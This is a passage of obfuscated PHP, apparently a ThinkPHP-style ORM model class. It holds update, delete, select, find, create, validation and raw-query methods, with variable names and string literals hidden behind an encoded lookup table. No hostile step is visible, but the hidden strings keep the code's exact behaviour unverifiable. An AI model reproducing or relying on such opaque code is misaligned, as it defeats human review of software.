$ÔôğÁÍÎ = array()) { $¾› =& $_SERVER[ •ŒÓîÆ]; if (empty($ÅÛåŒ€)) { if (!empty($this->data)) { $ÅÛåŒ€ = $this->data; $this->data = array(); } else { $this->error = think_lang($¾›[326]); return !1; } } $ÅÛåŒ€ = $this->_facade($ÅÛåŒ€); $ÔôğÁÍÎ = $this->_parseOptions($ÔôğÁÍÎ); $ŸÏñ´¸Ÿ = $this->getPk(); if (!isset($ÔôğÁÍÎ[$¾›[330]])) { if (isset($ÅÛåŒ€[$ŸÏñ´¸Ÿ])) { $–±ÙôÁ[$ŸÏñ´¸Ÿ] = $ÅÛåŒ€[$ŸÏñ´¸Ÿ]; $ÔôğÁÍÎ[$¾›[330]] = $–±ÙôÁ; unset($ÅÛåŒ€[$ŸÏñ´¸Ÿ]); } else { $this->error = think_lang($¾›[329]); return !1; } } if (is_array($ÔôğÁÍÎ[$¾›[330]]) && isset($ÔôğÁÍÎ[$¾›[330]][$ŸÏñ´¸Ÿ])) { $¹˜ƒ¸Ã¡ = $ÔôğÁÍÎ[$¾›[330]][$ŸÏñ´¸Ÿ]; } if (!1 === $this->_beforeUpdate($ÅÛåŒ€, $ÔôğÁÍÎ)) { return !1; } $¨üªâšÀ = $this->db->update($ÅÛåŒ€, $ÔôğÁÍÎ); if (!1 !== $¨üªâšÀ) { if (isset($¹˜ƒ¸Ã¡)) { $ÅÛåŒ€[$ŸÏñ´¸Ÿ] = $¹˜ƒ¸Ã¡; } $this->_afterUpdate($ÅÛåŒ€, $ÔôğÁÍÎ); } return $¨üªâšÀ; } protected function _beforeUpdate(&$îËÎƒº, $Êì¯¨ö) { } protected function _afterUpdate($Üè×ÈÒ™, $Ç³Â…Ğ¼) { } public function delete($Úõ¹”­ä = array()) { $ßı™­„ò =& $_SERVER[ •ŒÓîÆ]; if (empty($Úõ¹”­ä) && empty($this->options[$ßı™­„ò[330]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ˆœ›ï’‰ = $this->getPk(); if (is_numeric($Úõ¹”­ä) || is_string($Úõ¹”­ä)) { if (strpos($Úõ¹”­ä, $ßı™­„ò[50])) { $„İ©¥¯[$ˆœ›ï’‰] = array($ßı™­„ò[331], $Úõ¹”­ä); } else { $„İ©¥¯[$ˆœ›ï’‰] = $Úõ¹”­ä; } $this->options[$ßı™­„ò[330]] = $„İ©¥¯; } $Úõ¹”­ä = $this->_parseOptions(); if (is_array($Úõ¹”­ä[$ßı™­„ò[330]]) && isset($Úõ¹”­ä[$ßı™­„ò[330]][$ˆœ›ï’‰])) { $®¬¾ç›Ù = $Úõ¹”­ä[$ßı™­„ò[330]][$ˆœ›ï’‰]; } $ŠÏ•ƒÔï = $this->db->delete($Úõ¹”­ä); if (!1 !== $ŠÏ•ƒÔï) { $Ç¶Õ–¦… = array(); if (isset($®¬¾ç›Ù)) { $Ç¶Õ–¦…[$ˆœ›ï’‰] = $®¬¾ç›Ù; } $this->_after_delete($Ç¶Õ–¦…, $Úõ¹”­ä); } return $ŠÏ•ƒÔï; } protected function _after_delete($î§ùÈû, $Á…³´·Â) { } public function select($Óçü¢ = array()) { $´Ø¼å§ß =& $_SERVER[ •ŒÓîÆ]; if (is_string($Óçü¢) || is_numeric($Óçü¢)) { $Û¡°ĞØ = $this->getPk(); if (strpos($Óçü¢, $´Ø¼å§ß[50])) { $îá÷ûÔ[$Û¡°ĞØ] = array($´Ø¼å§ß[331], $Óçü¢); } else { $îá÷ûÔ[$Û¡°ĞØ] = $Óçü¢; } $this->options[$´Ø¼å§ß[330]] = $îá÷ûÔ; } elseif (!1 === $Óçü¢) { $Óçü¢ = $this->_parseOptions(); return $´Ø¼å§ß[332] . $this->db->buildSelectSql($Óçü¢) . $´Ø¼å§ß[333]; } $Óçü¢ = $this->_parseOptions(); $ğÎ“Ù—Ê = $this->db->select($Óçü¢); if (!1 === $ğÎ“Ù—Ê) { return !1; } if (empty($ğÎ“Ù—Ê)) { return null; } $this->_afterSelect($ğÎ“Ù—Ê, $Óçü¢); return $ğÎ“Ù—Ê; } protected function _afterSelect(&$ ñ×‡‡ã, $‘Ÿã¯Í) { } public function buildSql($Áß Ö = array()) { $»½ãçš÷ =& $_SERVER[ •ŒÓîÆ]; $Áß Ö = $this->_parseOptions($Áß Ö); return $»½ãçš÷[332] . $this->db->buildSelectSql($Áß Ö) . $»½ãçš÷[333]; } public function optionsValue($ÅÛŒ¼Éæ = null) { if (is_null($ÅÛŒ¼Éæ)) { return $this->options; } elseif (is_array($ÅÛŒ¼Éæ)) { $this->options = array_merge($this->options, $ÅÛŒ¼Éæ); } } protected function _parseOptions($µÙµ–Ç = array()) { $âĞ©ä­€ =& $_SERVER[ •ŒÓîÆ]; if (is_array($µÙµ–Ç)) { $µÙµ–Ç = array_merge($this->options, $µÙµ–Ç); } $this->options = array(); if (!isset($µÙµ–Ç[$âĞ©ä­€[334]])) { $µÙµ–Ç[$âĞ©ä­€[334]] = $this->getTableName(); $¦Œ¦â× = $this->fields; } else { $¦Œ¦â× = $this->getDbFields(); } if (!empty($µÙµ–Ç[$âĞ©ä­€[335]])) { $µÙµ–Ç[$âĞ©ä­€[334]] .= $âĞ©ä­€[53] . $µÙµ–Ç[$âĞ©ä­€[335]]; } $µÙµ–Ç[$âĞ©ä­€[336]] = $this->name; if (isset($µÙµ–Ç[$âĞ©ä­€[330]]) && is_array($µÙµ–Ç[$âĞ©ä­€[330]]) && !empty($¦Œ¦â×) && !isset($µÙµ–Ç[$âĞ©ä­€[337]]) && !isset($µÙµ–Ç[$âĞ©ä­€[334]])) { foreach ($µÙµ–Ç[$âĞ©ä­€[330]] as $±±ßÌ†ù => $àÄ½¿–­) { $±±ßÌ†ù = trim($±±ßÌ†ù); if (in_array($±±ßÌ†ù, $¦Œ¦â×, !0)) { if (is_scalar($àÄ½¿–­)) { $this->_parseType($µÙµ–Ç[$âĞ©ä­€[330]], $±±ßÌ†ù); } } elseif (!is_numeric($±±ßÌ†ù) && $âĞ©ä­€[11] != substr($±±ßÌ†ù, 0, 1) && !1 === strpos($±±ßÌ†ù, $âĞ©ä­€[10]) && !1 === strpos($±±ßÌ†ù, $âĞ©ä­€[315]) && !1 === strpos($±±ßÌ†ù, $âĞ©ä­€[338]) && !1 === strpos($±±ßÌ†ù, $âĞ©ä­€[339])) { unset($µÙµ–Ç[$âĞ©ä­€[330]][$±±ßÌ†ù]); } } } $this->_options_filter($µÙµ–Ç); return $µÙµ–Ç; } protected function _options_filter(&$Úëç‰î©) { } protected function _parseType(&$ª†ì‹·¹, $üŸíùÓĞ) { $«êôµÍ =& $_SERVER[ •ŒÓîÆ]; if (empty($this->options[$«êôµÍ[340]][$«êôµÍ[4] . $üŸíùÓĞ])) { $œóê‰ú = strtolower($this->fields[$«êôµÍ[307]][$üŸíùÓĞ]); if (!1 !== strpos($œóê‰ú, $«êôµÍ[341])) { } elseif (!1 === strpos($œóê‰ú, $«êôµÍ[342]) && !1 !== strpos($œóê‰ú, $«êôµÍ[343])) { $ª†ì‹·¹[$üŸíùÓĞ] = intval($ª†ì‹·¹[$üŸíùÓĞ]); } elseif (!1 !== strpos($œóê‰ú, $«êôµÍ[344]) || !1 !== strpos($œóê‰ú, $«êôµÍ[345])) { $ª†ì‹·¹[$üŸíùÓĞ] = floatval($ª†ì‹·¹[$üŸíùÓĞ]); } elseif (!1 !== strpos($œóê‰ú, $«êôµÍ[346])) { $ª†ì‹·¹[$üŸíùÓĞ] = (bool) $ª†ì‹·¹[$üŸíùÓĞ]; } } } public function find($õ¦‹ß† = array()) { $®ç£·Ùµ =& $_SERVER[ •ŒÓîÆ]; if (is_numeric($õ¦‹ß†) || is_string($õ¦‹ß†)) { $ÂÔ¢š™”[$this->getPk()] = intval($õ¦‹ß†); $this->options[$®ç£·Ùµ[330]] = $ÂÔ¢š™”; } $this->options[$®ç£·Ùµ[347]] = 1; $õ¦‹ß† = $this->_parseOptions(); $û´ÈÆ“‚ = $this->db->select($õ¦‹ß†); if (!1 === $û´ÈÆ“‚) { return !1; } if (empty($û´ÈÆ“‚)) { return null; } $this->data = $û´ÈÆ“‚[0]; $this->_afterFind($this->data, $õ¦‹ß†); if (!empty($this->options[$®ç£·Ùµ[348]])) { return $this->returnResult($this->data, $this->options[$®ç£·Ùµ[348]]); } return $this->data; } protected function _afterFind(&$½ÍÙ×°×, $©àÍÖÖ£) { } protected function returnResult($Æ†Şœ»ã, $£ˆõ£ = '') { $»ÇâÎÅ¯ =& $_SERVER[ •ŒÓîÆ]; if ($£ˆõ£) { if (is_callable($£ˆõ£)) { return call_user_func($£ˆõ£, $Æ†Şœ»ã); } switch (strtolower($£ˆõ£)) { case $»ÇâÎÅ¯[349]: return json_encode($Æ†Şœ»ã); case $»ÇâÎÅ¯[350]: return xml_encode($Æ†Şœ»ã); } } return $Æ†Şœ»ã; } public function parseFieldsMap($øíš ş, $×ì¸ô¨¶ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $²ÌŠ¹²ş => $É‡Ê Üë) { if ($×ì¸ô¨¶ == 1) { if (isset($øíš ş[$É‡Ê Üë])) { $øíš ş[$²ÌŠ¹²ş] = $øíš ş[$É‡Ê Üë]; unset($øíš ş[$É‡Ê Üë]); } } else { if (isset($øíš ş[$²ÌŠ¹²ş])) { $øíš ş[$É‡Ê Üë] = $øíš ş[$²ÌŠ¹²ş]; unset($øíš ş[$²ÌŠ¹²ş]); } } } } return $øíš ş; } public function setField($¥ïÑü—ê, $ßÑ¼úÕ¨ = '') { if (is_array($¥ïÑü—ê)) { $ïä²Œ¤Ã = $¥ïÑü—ê; } else { $ïä²Œ¤Ã[$¥ïÑü—ê] = $ßÑ¼úÕ¨; } return $this->save($ïä²Œ¤Ã); } public function setAdd($­³Õ‹¬, $ä÷ƒ¢å‰ = 1) { $Ÿ®®™› =& $_SERVER[ •ŒÓîÆ]; $¹¡Á„¥Ñ = $­³Õ‹¬ . $Ÿ®®™›[351] . $ä÷ƒ¢å‰; if ($ä÷ƒ¢å‰ < 0) { $¹¡Á„¥Ñ = $­³Õ‹¬ . $ä÷ƒ¢å‰; } return $this->setField($­³Õ‹¬, array($Ÿ®®™›[352], $¹¡Á„¥Ñ)); } public function getField($¬ùÏÜĞ×, $Å¬£®çú = null) { $æ³åé–¦ =& $_SERVER[ •ŒÓîÆ]; $”İª¼Ó²[$æ³åé–¦[328]] = $¬ùÏÜĞ×; $”İª¼Ó² = $this->_parseOptions($”İª¼Ó²); $¬ùÏÜĞ× = trim($¬ùÏÜĞ×); if (strpos($¬ùÏÜĞ×, $æ³åé–¦[50])) { if (!isset($”İª¼Ó²[$æ³åé–¦[347]])) { $”İª¼Ó²[$æ³åé–¦[347]] = is_numeric($Å¬£®çú) ? $Å¬£®çú : $æ³åé–¦[12]; } $Àúˆóè = $this->db->select($”İª¼Ó²); if (!empty($Àúˆóè)) { $¬³¾È¿ê = explode($æ³åé–¦[50], $¬ùÏÜĞ×); $¬ùÏÜĞ× = array_keys($Àúˆóè[0]); $€·«ÚÅ¦ = array_shift($¬ùÏÜĞ×); $É²º‰ıü = array_shift($¬ùÏÜĞ×); $êÂü€Ì = array(); $¦úÌ¡ûÄ = count($¬³¾È¿ê); foreach ($Àúˆóè as $ãŞåı¤) { $€¶ÆùŸ = $ãŞåı¤[$€·«ÚÅ¦]; if (2 == $¦úÌ¡ûÄ) { $êÂü€Ì[$€¶ÆùŸ] = $ãŞåı¤[$É²º‰ıü]; } else { $êÂü€Ì[$€¶ÆùŸ] = is_string($Å¬£®çú) ? implode($Å¬£®çú, $ãŞåı¤) : $ãŞåı¤; } } return $êÂü€Ì; } } else { if (!0 !== $Å¬£®çú) { $”İª¼Ó²[$æ³åé–¦[347]] = is_numeric($Å¬£®çú) ? $Å¬£®çú : 1; } if ($Å¬£®çú === $æ³åé–¦[310]) { unset($”İª¼Ó²[$æ³åé–¦[347]]); } $ãŞåı¤ = $this->db->select($”İª¼Ó²); if (!empty($ãŞåı¤)) { if ($Å¬£®çú === $æ³åé–¦[310]) { return reset($ãŞåı¤[0]); } if (!0 !== $Å¬£®çú && 1 == $”İª¼Ó²[$æ³åé–¦[347]]) { return reset($ãŞåı¤[0]); } foreach ($ãŞåı¤ as $«ü©ìàñ) { $Ô£õ“øÓ[] = $«ü©ìàñ[$¬ùÏÜĞ×]; } return $Ô£õ“øÓ; } } return null; } public function create($Ÿ¡æ·ÎÏ = '', $ø°‰æú‘ = '') { $¶¤š¿ç =& $_SERVER[ •ŒÓîÆ]; if (empty($Ÿ¡æ·ÎÏ)) { $Ÿ¡æ·ÎÏ = $_POST; } elseif (is_object($Ÿ¡æ·ÎÏ)) { $Ÿ¡æ·ÎÏ = get_object_vars($Ÿ¡æ·ÎÏ); } if (empty($Ÿ¡æ·ÎÏ) || !is_array($Ÿ¡æ·ÎÏ)) { $this->error = think_lang($¶¤š¿ç[326]); return !1; } $Ÿ¡æ·ÎÏ = $this->parseFieldsMap($Ÿ¡æ·ÎÏ, 0); $ø°‰æú‘ = $ø°‰æú‘ ? $ø°‰æú‘ : (!empty($Ÿ¡æ·ÎÏ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$¶¤š¿ç[328]])) { $÷ñ×Ü¨ = $this->options[$¶¤š¿ç[328]]; unset($this->options[$¶¤š¿ç[328]]); } elseif ($ø°‰æú‘ == THINK_MODEL_INSERT && isset($this->insertFields)) { $÷ñ×Ü¨ = $this->insertFields; } elseif ($ø°‰æú‘ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $÷ñ×Ü¨ = $this->updateFields; } if (isset($÷ñ×Ü¨)) { if (is_string($÷ñ×Ü¨)) { $÷ñ×Ü¨ = explode($¶¤š¿ç[50], $÷ñ×Ü¨); } if (think_config($¶¤š¿ç[353])) { $÷ñ×Ü¨[] = think_config($¶¤š¿ç[354]); } foreach ($Ÿ¡æ·ÎÏ as $Ñ’ÂôÃ¿ => $–ò„õÈÀ) { if (!in_array($Ñ’ÂôÃ¿, $÷ñ×Ü¨)) { unset($Ÿ¡æ·ÎÏ[$Ñ’ÂôÃ¿]); } } } if (!$this->autoValidation($Ÿ¡æ·ÎÏ, $ø°‰æú‘)) { return !1; } if (!$this->autoCheckToken($Ÿ¡æ·ÎÏ)) { $this->error = think_lang($¶¤š¿ç[355]); return !1; } if ($this->autoCheckFields) { $÷ñ×Ü¨ = $this->getDbFields(); foreach ($Ÿ¡æ·ÎÏ as $Ñ’ÂôÃ¿ => $–ò„õÈÀ) { if (!in_array($Ñ’ÂôÃ¿, $÷ñ×Ü¨)) { unset($Ÿ¡æ·ÎÏ[$Ñ’ÂôÃ¿]); } elseif (MAGIC_QUOTES_GPC && is_string($–ò„õÈÀ)) { $Ÿ¡æ·ÎÏ[$Ñ’ÂôÃ¿] = stripslashes($–ò„õÈÀ); } } } $this->autoOperation($Ÿ¡æ·ÎÏ, $ø°‰æú‘); $this->data = $Ÿ¡æ·ÎÏ; return $Ÿ¡æ·ÎÏ; } public function autoCheckToken($°ĞÛ ãÍ) { $õËâ ×Ù =& $_SERVER[ •ŒÓîÆ]; if (isset($this->options[$õËâ ×Ù[356]]) && !$this->options[$õËâ ×Ù[356]]) { return !0; } if (think_config($õËâ ×Ù[353])) { $™Õ«È = think_config($õËâ ×Ù[354]); if (!isset($°ĞÛ ãÍ[$™Õ«È]) || Session::get($™Õ«È)) { return !1; } list($ÕËÂƒ«½, $õó´’Ÿ®) = explode($õËâ ×Ù[11], $°ĞÛ ãÍ[$™Õ«È]); if ($õó´’Ÿ® && Session::get($™Õ«È . $õËâ ×Ù[10] . $ÕËÂƒ«½) === $õó´’Ÿ®) { Session::remove($™Õ«È . $õËâ ×Ù[10] . $ÕËÂƒ«½); return !0; } if (think_config($õËâ ×Ù[357])) { Session::remove($™Õ«È . $õËâ ×Ù[10] . $ÕËÂƒ«½); } return !1; } return !0; } public function regex($™§åçé‹, $›–¨°Ê) { $Òüì‘í =& $_SERVER[ •ŒÓîÆ]; $ÎŞ£ñè§ = array($Òüì‘í[358] => $Òüì‘í[359], $Òüì‘í[360] => $Òüì‘í[361], $Òüì‘í[362] => $Òüì‘í[363], $Òüì‘í[364] => $Òüì‘í[365], $Òüì‘í[366] => $Òüì‘í[367], $Òüì‘í[368] => $Òüì‘í[369], $Òüì‘í[370] => $Òüì‘í[371], $Òüì‘í[345] => $Òüì‘í[372], $Òüì‘í[373] => $Òüì‘í[374]); if (isset($ÎŞ£ñè§[strtolower($›–¨°Ê)])) { $›–¨°Ê = $ÎŞ£ñè§[strtolower($›–¨°Ê)]; } return preg_match($›–¨°Ê, $™§åçé‹) === 1; } private function autoOperation(&$ŞŸˆ¤ô, $µ‹ó á’) { $ßÑ¼âéÈ =& $_SERVER[ •ŒÓîÆ]; if (!empty($this->options[$ßÑ¼âéÈ[375]])) { $²·©©œ÷ = $this->options[$ßÑ¼âéÈ[375]]; unset($this->options[$ßÑ¼âéÈ[375]]); } elseif (!empty($this->_auto)) { $²·©©œ÷ = $this->_auto; } if (isset($²·©©œ÷)) { foreach ($²·©©œ÷ as $±ë¢‰Û™) { if (empty($±ë¢‰Û™[2])) { $±ë¢‰Û™[2] = THINK_MODEL_INSERT; } if ($µ‹ó á’ == $±ë¢‰Û™[2] || $±ë¢‰Û™[2] == THINK_MODEL_BOTH) { switch (trim($±ë¢‰Û™[3])) { case $ßÑ¼âéÈ[376]: case $ßÑ¼âéÈ[377]: $àÄØŞŠœ = isset($±ë¢‰Û™[4]) ? (array) $±ë¢‰Û™[4] : array(); if (isset($ŞŸˆ¤ô[$±ë¢‰Û™[0]])) { array_unshift($àÄØŞŠœ, $ŞŸˆ¤ô[$±ë¢‰Û™[0]]); } if ($ßÑ¼âéÈ[376] == $±ë¢‰Û™[3]) { $ŞŸˆ¤ô[$±ë¢‰Û™[0]] = call_user_func_array($±ë¢‰Û™[1], $àÄØŞŠœ); } else { $ŞŸˆ¤ô[$±ë¢‰Û™[0]] = call_user_func_array(array(&$this, $±ë¢‰Û™[1]), $àÄØŞŠœ); } break; case $ßÑ¼âéÈ[328]: $ŞŸˆ¤ô[$±ë¢‰Û™[0]] = $ŞŸˆ¤ô[$±ë¢‰Û™[1]]; break; case $ßÑ¼âéÈ[378]: if ($ßÑ¼âéÈ[12] === $ŞŸˆ¤ô[$±ë¢‰Û™[0]]) { unset($ŞŸˆ¤ô[$±ë¢‰Û™[0]]); } break; case $ßÑ¼âéÈ[379]: default: $ŞŸˆ¤ô[$±ë¢‰Û™[0]] = $±ë¢‰Û™[1]; } if (!1 === $ŞŸˆ¤ô[$±ë¢‰Û™[0]]) { unset($ŞŸˆ¤ô[$±ë¢‰Û™[0]]); } } } } return $ŞŸˆ¤ô; } protected function autoValidation($«¿òèŸê, $ˆúÀ´›Ó) { $øµ™â¡ =& $_SERVER[ •ŒÓîÆ]; if (!empty($this->options[$øµ™â¡[380]])) { $ÜÌ¶ôó = $this->options[$øµ™â¡[380]]; unset($this->options[$øµ™â¡[380]]); } elseif (!empty($this->_validate)) { $ÜÌ¶ôó = $this->_validate; } if (isset($ÜÌ¶ôó)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÜÌ¶ôó as $šúşù§Ö => $Ñº¸º‘) { if (empty($Ñº¸º‘[5]) || $Ñº¸º‘[5] == THINK_MODEL_BOTH || $Ñº¸º‘[5] == $ˆúÀ´›Ó) { if (0 == strpos($Ñº¸º‘[2], $øµ™â¡[381]) && strpos($Ñº¸º‘[2], $øµ™â¡[382])) { $Ñº¸º‘[2] = think_lang(substr($Ñº¸º‘[2], 2, -1)); } $Ñº¸º‘[3] = isset($Ñº¸º‘[3]) ? $Ñº¸º‘[3] : THINK_EXISTS_VALIDATE; $Ñº¸º‘[4] = isset($Ñº¸º‘[4]) ? $Ñº¸º‘[4] : $øµ™â¡[383]; switch ($Ñº¸º‘[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($«¿òèŸê, $Ñº¸º‘)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($øµ™â¡[12] != trim($«¿òèŸê[$Ñº¸º‘[0]])) { if (!1 === $this->_validationField($«¿òèŸê, $Ñº¸º‘)) { return !1; } } break; default: if (isset($«¿òèŸê[$Ñº¸º‘[0]])) { if (!1 === $this->_validationField($«¿òèŸê, $Ñº¸º‘)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ª†·ÀÕÛ, $¦üÎ³­») { if (!1 === $this->_validationFieldItem($ª†·ÀÕÛ, $¦üÎ³­»)) { if ($this->patchValidate) { $this->error[$¦üÎ³­»[0]] = $¦üÎ³­»[2]; } else { $this->error = $¦üÎ³­»[2]; return !1; } } return; } protected function _validationFieldItem($‡‡¿Øš, $€ŞÔô¥„) { $÷äÆÅÆ¿ =& $_SERVER[ •ŒÓîÆ]; switch (strtolower(trim($€ŞÔô¥„[4]))) { case $÷äÆÅÆ¿[376]: case $÷äÆÅÆ¿[377]: $ù‡Â–ËÊ = isset($€ŞÔô¥„[6]) ? (array) $€ŞÔô¥„[6] : array(); if (is_string($€ŞÔô¥„[0]) && strpos($€ŞÔô¥„[0], $÷äÆÅÆ¿[50])) { $€ŞÔô¥„[0] = explode($÷äÆÅÆ¿[50], $€ŞÔô¥„[0]); } if (is_array($€ŞÔô¥„[0])) { foreach ($€ŞÔô¥„[0] as $â¦Î™Á¯) { $¼ƒÂÈÇù[$â¦Î™Á¯] = $‡‡¿Øš[$â¦Î™Á¯]; } array_unshift($ù‡Â–ËÊ, $¼ƒÂÈÇù); } else { array_unshift($ù‡Â–ËÊ, $‡‡¿Øš[$€ŞÔô¥„[0]]); } if ($÷äÆÅÆ¿[376] == $€ŞÔô¥„[4]) { return call_user_func_array($€ŞÔô¥„[1], $ù‡Â–ËÊ); } else { return call_user_func_array(array(&$this, $€ŞÔô¥„[1]), $ù‡Â–ËÊ); } case $÷äÆÅÆ¿[384]: return $‡‡¿Øš[$€ŞÔô¥„[0]] == $‡‡¿Øš[$€ŞÔô¥„[1]]; case $÷äÆÅÆ¿[385]: if (is_string($€ŞÔô¥„[0]) && strpos($€ŞÔô¥„[0], $÷äÆÅÆ¿[50])) { $€ŞÔô¥„[0] = explode($÷äÆÅÆ¿[50], $€ŞÔô¥„[0]); } $¤ı›Ç = array(); if (is_array($€ŞÔô¥„[0])) { foreach ($€ŞÔô¥„[0] as $â¦Î™Á¯) { $¤ı›Ç[$â¦Î™Á¯] = $‡‡¿Øš[$â¦Î™Á¯]; } } else { $¤ı›Ç[$€ŞÔô¥„[0]] = $‡‡¿Øš[$€ŞÔô¥„[0]]; } if (!empty($‡‡¿Øš[$this->getPk()])) { $¤ı›Ç[$this->getPk()] = array($÷äÆÅÆ¿[386], $‡‡¿Øš[$this->getPk()]); } if ($this->where($¤ı›Ç)->find()) { return !1; } return !0; default: return $this->check($‡‡¿Øš[$€ŞÔô¥„[0]], $€ŞÔô¥„[1], $€ŞÔô¥„[4]); } } public function check($¾Šîº†, $œ»³•Ìœ, $©ÄÉ´­¸ = "\162\145\x67\145\170") { $ ƒÇ™É =& $_SERVER[ •ŒÓîÆ]; $©ÄÉ´­¸ = strtolower(trim($©ÄÉ´­¸)); switch ($©ÄÉ´­¸) { case $ ƒÇ™É[7]: case $ ƒÇ™É[387]: $ÆÎµøïÑ = is_array($œ»³•Ìœ) ? $œ»³•Ìœ : explode($ ƒÇ™É[50], $œ»³•Ìœ); return $©ÄÉ´­¸ == $ ƒÇ™É[7] ? in_array($¾Šîº†, $ÆÎµøïÑ) : !in_array($¾Šîº†, $ÆÎµøïÑ); case $ ƒÇ™É[388]: case $ ƒÇ™É[389]: if (is_array($œ»³•Ìœ)) { $½Ëç¬Ş = $œ»³•Ìœ[0]; $ßˆÖÑµ± = $œ»³•Ìœ[1]; } else { list($½Ëç¬Ş, $ßˆÖÑµ±) = explode($ ƒÇ™É[50], $œ»³•Ìœ); } return $©ÄÉ´­¸ == $ ƒÇ™É[388] ? $¾Šîº† >= $½Ëç¬Ş && $¾Šîº† <= $ßˆÖÑµ± : $¾Šîº† < $½Ëç¬Ş || $¾Šîº† > $ßˆÖÑµ±; case $ ƒÇ™É[390]: case $ ƒÇ™É[391]: return $©ÄÉ´­¸ == $ ƒÇ™É[390] ? $¾Šîº† == $œ»³•Ìœ : $¾Šîº† != $œ»³•Ìœ; case $ ƒÇ™É[392]: $ô˜èÔÔâ = mb_strlen($¾Šîº†, $ ƒÇ™É[393]); if (strpos($œ»³•Ìœ, $ ƒÇ™É[50])) { list($½Ëç¬Ş, $ßˆÖÑµ±) = explode($ ƒÇ™É[50], $œ»³•Ìœ); return $ô˜èÔÔâ >= $½Ëç¬Ş && $ô˜èÔÔâ <= $ßˆÖÑµ±; } else { return $ô˜èÔÔâ == $œ»³•Ìœ; } case $ ƒÇ™É[394]: list($ƒÉ¬•Êî, $Â§éåÉÏ) = explode($ ƒÇ™É[50], $œ»³•Ìœ); if (!is_numeric($ƒÉ¬•Êî)) { $ƒÉ¬•Êî = strtotime($ƒÉ¬•Êî); } if (!is_numeric($Â§éåÉÏ)) { $Â§éåÉÏ = strtotime($Â§éåÉÏ); } return NOW_TIME >= $ƒÉ¬•Êî && NOW_TIME <= $Â§éåÉÏ; case $ ƒÇ™É[395]: return in_array(get_client_ip(), explode($ ƒÇ™É[50], $œ»³•Ìœ)); case $ ƒÇ™É[396]: return !in_array(get_client_ip(), explode($ ƒÇ™É[50], $œ»³•Ìœ)); case $ ƒÇ™É[383]: default: return $this->regex($¾Šîº†, $œ»³•Ìœ); } } public function query($âÑ¸¦ªí, $·±óÃ = false) { $ÜÓ½™©ì =& $_SERVER[ •ŒÓîÆ]; if (!is_bool($·±óÃ) && !is_array($·±óÃ)) { $·±óÃ = func_get_args(); array_shift($·±óÃ); } $âÑ¸¦ªí = str_replace(array($ÜÓ½™©ì[248], $ÜÓ½™©ì[397]), $ÜÓ½™©ì[53], $âÑ¸¦ªí); $âÑ¸¦ªí = $this->parseSql($âÑ¸¦ªí, $·±óÃ); return $this->db->query($âÑ¸¦ªí); } public function execute($½ğËëèÖ, $š—‹á¯– = false) { if (!is_bool($š—‹á¯–) && !is_array($š—‹á¯–)) { $š—‹á¯– = func_get_args(); array_shift($š—‹á¯–); } $½ğËëèÖ = $this->parseSql($½ğËëèÖ, $š—‹á¯–); return $this->db->execute($½ğËëèÖ); } protected function parseSql($µ’¡ÙÜ°, $£ì”·¿‘) { $˜·Ó—íü =& $_SERVER[ •ŒÓîÆ]; if (!0 === $£ì”·¿‘) { $ªƒ×Ù = $this->_parseOptions(); $µ’¡ÙÜ° = $this->db->parseSql($µ’¡ÙÜ°, $ªƒ×Ù); } elseif (is_array($£ì”·¿‘)) { $£ì”·¿‘ = array_map(array($this->db, $˜·Ó—íü[398]), $£ì”·¿‘); $µ’¡ÙÜ° = vsprintf($µ’¡ÙÜ°, $£ì”·¿‘); } else { $µ’¡ÙÜ° = strtr($µ’¡ÙÜ°, array($˜·Ó—íü[399] => $this->getTableName(), $˜·Ó—íü[400] => think_config($˜·Ó—íü[299]))); } $this->db->setModel($this->name); return $µ’¡ÙÜ°; } public function db($“›µ”Ñô = '', $¸Å÷¹ôÙ = '', $Ä„ÄıÆ¯ = array()) { $—¦ãåÂÈ =& $_SERVER[ •ŒÓîÆ]; if ($—¦ãåÂÈ[12] === $“›µ”Ñô && $this->db) { return $this->db; } static $î™ÜÁ–ë = array(); static $™Ñ‘Ûüç = array(); if (!isset($™Ñ‘Ûüç[$“›µ”Ñô]) || isset($™Ñ‘Ûüç[$“›µ”Ñô]) && $¸Å÷¹ôÙ && $î™ÜÁ–ë[$“›µ”Ñô] != $¸Å÷¹ôÙ) { if (!empty($¸Å÷¹ôÙ) && is_string($¸Å÷¹ôÙ) && !1 === strpos($¸Å÷¹ôÙ, $—¦ãåÂÈ[8])) { $¸Å÷¹ôÙ = think_config($¸Å÷¹ôÙ); } $“›µ”Ñô = think_guid($¸Å÷¹ôÙ); $™Ñ‘Ûüç[$“›µ”Ñô] = Db::getInstance($¸Å÷¹ôÙ); } elseif (NULL === $¸Å÷¹ôÙ) { $™Ñ‘Ûüç[$“›µ”Ñô]->close(); unset($™Ñ‘Ûüç[$“›µ”Ñô]); return; } if (!empty($Ä„ÄıÆ¯)) { if (is_string($Ä„ÄıÆ¯)) { parse_str($Ä„ÄıÆ¯, $Ä„ÄıÆ¯); } foreach ($Ä„ÄıÆ¯ as $”Ñ…•±“ => $™ŸÙüÒÛ) { $this->setProperty($”Ñ…•±“, $™ŸÙüÒÛ); } } $î™ÜÁ–ë[$“›µ”Ñô] = $¸Å÷¹ôÙ; $this->db = $™Ñ‘Ûüç[$“›µ”Ñô]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $òÃÑ­§Ë = get_class($this); if ($òÃÑ­§Ë == $_SERVER[ •ŒÓîÆ][401]) { return $this->name; } $this->name = substr($òÃÑ­§Ë, 0, -5); } return $this->name; } public function getTableName() { $ÕÂî¬Ğ‘ =& $_SERVER[ •ŒÓîÆ]; if (empty($this->trueTableName)) { $ÁÕä¶÷  = !empty($this->tablePrefix) ? $this->tablePrefix : $ÕÂî¬Ğ‘[12]; if (!empty($this->tableName)) { $ÁÕä¶÷  .= $this->tableName; } else { $ÁÕä¶÷  .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÁÕä¶÷ ); } return (!empty($this->dbName) ? $this->dbName . $ÕÂî¬Ğ‘[10] : $ÕÂî¬Ğ‘[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function 